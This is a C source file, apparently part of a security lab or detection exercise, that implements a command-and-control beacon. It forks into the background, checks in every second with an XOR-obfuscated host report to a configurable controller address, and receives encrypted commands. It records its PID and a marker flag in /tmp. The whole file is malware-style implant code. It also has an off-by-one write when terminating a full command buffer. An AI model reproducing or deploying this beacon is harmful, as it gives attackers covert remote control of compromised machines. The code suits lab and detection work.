#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include "lab_common.h"

void xor_encrypt(unsigned char *data, int len, unsigned char key) {
    for (int i = 0; i < len; i++) data[i] ^= key;
}

int run_c2_beacon(const char *c2_host, int c2_port) {
    pid_t child = fork();
    if (child == -1) { perror("[-] fork failed"); return -1; }
    
    if (child == 0) {
        setsid();
        printf("[+] C2 Beacon started - PID: %d\n", getpid());
        
        unsigned char beacon[] = "{\"hostname\":\"victim\",\"uid\":0,\"arch\":\"x86_64\"}";
        
        while (1) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock >= 0) {
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(c2_port);
                inet_pton(AF_INET, c2_host, &addr.sin_addr);
                
                if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    xor_encrypt(beacon, sizeof(beacon), 0xAB);
                    send(sock, beacon, sizeof(beacon), 0);
                    xor_encrypt(beacon, sizeof(beacon), 0xAB);
                    
                    char cmd[256];
                    int n = recv(sock, cmd, sizeof(cmd), 0);
                    if (n > 0) {
                        xor_encrypt((unsigned char*)cmd, n, 0xAB);
                        cmd[n] = 0;
                    }
                    close(sock);
                }
            }
            sleep(1);
        }
        _exit(0);
    }
    
    FILE *pf = fopen("/tmp/c2_beacon.pid", "w");
    if (pf) { fprintf(pf, "%d", child); fclose(pf); }
    
    set_flag("/tmp/.c2_beacon_active");
    return 0;
}

int main(int argc, char *argv[]) {
    const char *host = "192.168.1.100";
    int port = 9999;
    if (argc > 1) host = argv[1];
    if (argc > 2) port = atoi(argv[2]);
    return run_c2_beacon(host, port);
}
